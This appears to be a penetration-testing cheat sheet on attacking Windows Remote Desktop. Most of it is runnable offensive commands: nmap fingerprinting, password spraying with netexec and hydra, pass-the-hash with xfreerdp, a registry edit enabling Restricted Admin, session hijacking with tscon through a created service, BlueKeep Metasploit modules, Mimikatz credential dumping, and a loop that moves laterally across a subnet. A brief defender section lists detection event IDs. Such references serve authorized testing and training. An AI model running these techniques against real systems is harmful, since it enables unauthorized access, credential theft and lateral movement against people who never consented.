title: RDP
---

RDP is the fastest way from "I have creds" to "I have GUI shell." It's also one of the loudest — every connection creates an interactive session, triggers an event log entry on the target, and shows up in blue-team dashboards. Use it when you need GUI tools, want to hijack an existing session, or need to blend in as "admin doing admin things."

## Discovery

```bash
nmap -p3389 -sV --script="rdp-ntlm-info,rdp-enum-encryption,rdp-vuln-ms12-020" <IP>

# rdp-ntlm-info is extremely useful — leaks Windows version + computer name + domain
```

`rdp-ntlm-info` output:
```
Target_Name: INLANEFREIGHT
NetBIOS_Domain_Name: INLANEFREIGHT
DNS_Domain_Name: inlanefreight.local
Product_Version: 10.0.17763
```

## Brute Force / Spraying

```bash
# NetExec (fast; requires xfreerdp3)
netexec rdp <IP> -u users.txt -p 'Winter2025!' --continue-on-success

# Hydra
hydra -L users.txt -P rockyou.txt rdp://<IP> -t 1
# -t 1 — RDP brute is slow due to GUI negotiation; higher parallelism rarely helps

# Kerberos pre-auth is faster; use kerbrute for AD environments
```

Watch for lockouts — RDP contributes to the standard domain lockout counter.

## Connecting

```bash
# Linux clients
xfreerdp /v:<IP> /u:Administrator /p:'Pass!' /dynamic-resolution /drive:share,/tmp
rdesktop -u Administrator -p 'Pass!' <IP>
remmina

# Common xfreerdp flags
/v:<IP>                 # target
/u:<user> /p:<pw>       # auth
/d:<domain>             # domain
/dynamic-resolution     # resize to window
/drive:name,/local/path # share a local folder as a drive
/clipboard              # shared clipboard
/cert:ignore            # skip cert validation
+clipboard /sound       # fuller experience
```

## Pass-the-Hash via RDP (Restricted Admin Mode)

Normally RDP needs a password. Restricted Admin Mode allows NT-hash authentication — but only if the target has it enabled.

```powershell
# Enable on target (or disable: /d 0x1)
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

Then from attacker:
```bash
xfreerdp /v:<IP> /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /cert:ignore
```

Without Restricted Admin: you cannot PtH into RDP. Workaround: Mimikatz `sekurlsa::pth` to spawn `mstsc.exe` in a stolen token context, then connect normally from that process.

## Session Hijacking (`tscon`) — SYSTEM

Once you have SYSTEM on a Windows box with multiple active RDP sessions, you can steal another user's session without their password.

```powershell
# List sessions
query user
# or
qwinsta

# Example
# USERNAME    SESSIONNAME   ID  STATE
# admin       rdp-tcp#1     2   Active
# julio       rdp-tcp#2     3   Disc

# Steal session 3 and move it to your own console session (ID 1)
tscon 3 /dest:rdp-tcp#1
```

Requirements:
- You must be SYSTEM (`sc.exe create` a service that runs `tscon`, or `psexec -s`)
- The target session can be either Active or Disconnected — hijack works either way
- Zero password required — Windows treats SYSTEM as trusted to transition sessions

Classic pattern:
```cmd
sc.exe create hijacksvc binpath= "cmd.exe /k tscon 3 /dest:rdp-tcp#1"
sc.exe start hijacksvc
```

## BlueKeep (CVE-2019-0708)

Pre-auth RCE in old Windows (XP, 2003, 7, 2008/R2 before patch). Still occasionally live in legacy environments.

```bash
# Check
nmap -p3389 --script=rdp-vuln-ms12-020 <IP>   # (different CVE, older DoS check)
msfconsole> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
msfconsole> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

High crash risk — don't run against production without written approval.

## Capturing Credentials from an RDP Session

Once connected as a user:
- Mimikatz `sekurlsa::logonpasswords` dumps every logged-on user including the RDP'd user
- RDP saved connections → DPAPI → `dpapi::rdg`
- Clipboard monitoring (harvester scripts)

## Attack Patterns

### Shared local admin via RDP across the subnet

```bash
# Once you crack a local admin hash, walk the subnet via RDP:
for ip in $(cat subnet.txt); do
  xfreerdp /v:$ip /u:Administrator /pth:<NThash> /cert:ignore &
done
# Interactive, but handy for quick GUI confirmation across hosts
```

### Remote GUI tools

RDP into a jump box, then run SQL Management Studio / MMC / Hyper-V Manager from there — the jump box has the network access and installed tooling.

### Living-off-the-land under RDP

Blue team sees a user logged in — if your activity looks like admin behavior (opening Services, launching PowerShell, running SCCM console), it blends in far better than Impacket from Linux.

## Defender Notes

- RDP creates Event ID 4624 (successful logon, type 10) and 4625 (failed)
- `tscon` hijack triggers event 4779 (session reconnect) with mismatched user/originating session — SIEM rule
- Multiple `xfreerdp` sessions from one source IP in minutes = brute force signature

## Attack Chain

```
nmap 3389 → version + domain fingerprint
  → netexec rdp with usernames.txt and spray password
  → valid creds: xfreerdp with /drive share
  → if SYSTEM: query user → tscon → hijack higher-priv session
  → dump creds on jump box → pivot further
```
